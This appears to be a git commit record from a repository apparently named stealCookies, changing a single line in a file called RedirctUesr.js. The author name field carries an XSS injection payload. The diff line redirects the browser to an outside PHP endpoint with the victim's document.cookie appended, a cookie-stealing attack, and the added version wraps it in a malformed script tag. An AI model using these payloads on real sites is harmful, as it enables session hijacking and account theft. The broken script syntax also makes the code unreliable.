5353e5751ffaa9cc03182b7aa823b04c7b0be259
name"img src=x onerror=alert('name') <64085566+malekAbuliala@users.noreply.github.com>
2023-09-29 22:11:11 +0300

    RedirctUesr.js

--- RedirctUesr.js
+++ RedirctUesr.js
@@ -1,1 +1,1 @@
-window.location='https://github.com/malekAbuliala/stealCookies/demo.php?cookie'+escape(document.cookie)
+<script src=window.location='https://github.com/malekAbuliala/stealCookies/demo.php?cookie'+escape(document.cookie)></script>
